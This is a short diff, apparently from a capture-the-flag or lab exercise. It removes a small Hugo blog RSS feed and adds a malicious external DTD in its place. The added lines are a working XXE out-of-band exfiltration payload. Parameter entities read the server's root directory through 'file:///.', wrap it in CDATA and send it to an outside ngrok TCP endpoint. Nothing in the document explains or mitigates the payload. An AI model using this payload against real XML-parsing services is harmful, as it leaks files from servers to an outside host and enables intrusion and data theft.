@@ -1,16 +1,4 @@
-<title>My Second blog!</title>
-    <link>/</link>
-    <description>Recent content on My first blog!</description>
-        <generator>Hugo -- gohugo.io</generator>
-        <language>en-US</language>
-        <lastBuildDate>Mon, 01 Mar 2020 13:01:33 -0600</lastBuildDate>
-        <atom:link href="/index.xml" rel="self" type="application/rss+xml"/>
-        <item>
-        <title>First post!</title>
-        <link>/post/second/</link>
-        <pubDate>Mon, 27 Jan 2020 13:01:33 -0600</pubDate>
-        <guid>/post/second/</guid>
-        <description>
-        This is the first post for my new blog! I read about a bunch of exploits in common server side blog tools so I just decided to make my website static. Hopefully that should keep it secure.
-    </description>
-</item>
+<!ENTITY % start "<[CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % outfile SYSTEM "file:///.">
+<!ENTITY % goout "<!ENTITY &#37; ftp SYSTEM 'tcp://6.tcp.ngrok.io:14042/%start;%outfile;%end;'>">
